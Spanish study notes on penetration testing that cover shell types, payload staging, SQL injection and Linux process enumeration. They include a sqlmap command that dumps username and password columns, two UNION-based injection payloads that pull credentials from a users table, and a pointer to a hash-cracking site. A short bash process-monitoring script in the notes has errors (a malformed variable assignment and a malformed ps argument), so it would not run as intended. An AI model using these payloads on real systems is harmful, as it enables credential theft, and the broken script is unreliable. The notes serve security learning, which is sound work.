#### reverse shell, bind shell, y forward shell
se enumeran las diferencias entre  [[reverse shell]], [[bind shell]] y [[forward shell]]

#### tipos de payloads
[[payload staged]] y [[payload non-staged]]

Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.

#### tipos de explotacion: manual y automatizadas
[[explotacion manual]]
[[explotacion automatizada]]

por ejemplo se puede hacer uso de la siguiente explotacion automatizada con [[sqlmap]]:
```bash
sqlmap -r request.req -p searchitem --batch -D sqltraining -T users -C username, password --dump
```
- `-r request.req` → usa una request HTTP real capturada
- `-p searchitem` → inyecta solo en el parámetro `searchitem`
- `--batch` → responde “sí” a todo automáticamente
- `-D sqltraining` → base de datos objetivo
- `-T users` → tabla objetivo
- `-C username,password` → columnas a extraer
- `--dump` → muestra los datos

query manual de sqli:
test' union select 1,2,database(),user(),5 from information_schema.schemata-- - 
- `1, 2, 5` → Valores de relleno para coincidir con la cantidad de columnas
- `database()` → Muestra el **nombre de la base de datos actual**
- `user()` → Muestra el **usuario de la base de datos**
- `information_schema.schemata` → Tabla del sistema con metadatos
- `-- -` → Comenta el resto de la query original

test' union select 1, username, password, 4, 5 from users-- -
- `username` → Columna con nombres de usuario
- `password` → Columna con contraseñas (normalmente hasheadas)
- `1, 4, 5` → Columnas de relleno
- `FROM users` → Tabla objetivo
- `-- -` → Anula el resto de la query original

hashed.com -> web que sirve para descifrar valores hasheados

### enumeracion del sistema
La enumeración es un proceso crítico para identificar por ejemplo vías potenciales de poder elevar nuestros privilegios de usuario, así como para comprender la estructura del sistema objetivo y encontrar información útil para futuros ataques.

[[LSE]] (linux smart enumeration): sirve para ver si un sistema linux es inseguro

Pspy: es una herramienta de enumeración de procesos que permite a los atacantes observar los procesos y comandos que se ejecutan en el sistema objetivo a intervalos regulares de tiempo. Pspy es una herramienta útil para la detección de malware y backdoors, así como para la identificación de procesos maliciosos que se ejecutan en segundo plano sin la interacción del usuario\.

los permisos SUID pueden ser peligrosos y podrian generar una escalada de privilegios

para ver la diferencia en los comandos que se ejecutan se puede hacer el siguiente script de bash:

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] exiting...\n"
	tput cnorm;exit 1
}

trap ctrl_c SIGINT

old_process=$(ps -eo user, command)

tput civis

while true; do
  new_process=$(ps -eo user, command)
  diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|kworker|procmon"
  old_process = $new_process
done
```


#### [[burpsuite]]
[[burpsuite]] es una herramienta de prueba de penetración utilizada para encontrar vulnerabilidades de seguridad en aplicaciones web. Es una de las herramientas de prueba de penetración más populares y utilizadas en la industria de la seguridad informática. BurpSuite se compone de varias herramientas diferentes que se pueden utilizar juntas para identificar vulnerabilidades en una aplicación web.